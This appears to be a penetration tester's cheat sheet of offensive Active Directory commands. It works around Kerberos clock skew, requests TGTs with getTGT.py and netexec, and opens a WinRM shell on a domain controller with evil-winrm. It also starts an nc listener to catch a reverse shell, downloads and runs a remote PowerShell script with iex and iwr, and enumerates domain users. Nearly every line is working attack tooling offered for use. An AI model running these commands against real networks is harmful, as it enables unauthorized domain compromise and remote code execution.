## KRB_AP_ERR_SKEW(Clock skew too great)

```bash
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

## evil-winrm without NTLM
```bash
# 1 - Get TGT
getTGT.py -dc-ip "DC01.domain.tld" "domain.tld"/"$USER":"$PASSWORD" -k
# 1_bis
nxc smb ip -u "$USER" -p "$PASSWORD" --generate-tgt NAME.ccache

# 2 - Edit /etc/krb5.conf, example :
[libdefaults]
        default_realm = DOMAIN.TLD
<SNIP>
[realms]
DOMAIN.TLD = {
    kdc = DC01.domain.tld
    kdc = DC01.domain.tld:88
}
# 2_bis 
nxc smb ip -u "$USER" -p "$PASSWORD" --generate-krb5-file  /etc/krb5.conf
export KRB5_CONFIG=/etc/krb5.conf

# 3 - Get WinRM shell
KRB5CCNAME=TICKET.ccache evil-winrm -i DC01.domain.tld -r domain.tld
```

## revshell using rlwrap
```bash
rlwrap -cAr nc -lvnp 1337
```

## Mount share inside exegol
```bash
--privileged
```

## Load script from web server
```powershell
iex (iwr -Uri "https://$IP/script.ps1" -UseBasicParsing)
```

## Extract only users, with netexec
```powershell
nxc smb "$IP" -u "$USER" -p "$PASSWORD" --users | awk '$1 == "SMB" && $5 !~ /^(\[\*\]|\[\+\]|-Username-)$/ { print $5 }'
```